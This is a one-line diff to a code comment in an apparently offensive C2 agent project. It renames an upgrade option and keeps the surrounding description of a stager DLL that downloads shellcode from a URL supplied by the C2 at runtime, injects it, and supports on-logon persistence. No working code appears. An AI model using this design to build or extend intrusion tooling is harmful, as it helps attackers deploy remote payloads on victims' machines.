@@ -5,7 +5,7 @@ namespace CSharpAgent
 {
     // The agent is NOT stored in this assembly. The C2 writes the selected agent row's direct
     // download URL for this build's target arch (x86 / x64 / ARM64) to the A_URL process env
-    // var BEFORE this DLL deserializes (the Upgrade window's 0x0C NativeUpgrade lines, the
+    // var BEFORE this DLL deserializes (the Upgrade window's 0x0C UpgradeNative lines, the
     // Persistence Manager's on-logon flow, or the legacy one-shot path); we fetch the raw
     // position-independent bytes at runtime and inject them. Standalone (no A_URL) Data is
     // empty and nothing is injected, keeping the repo self-contained and compilable without
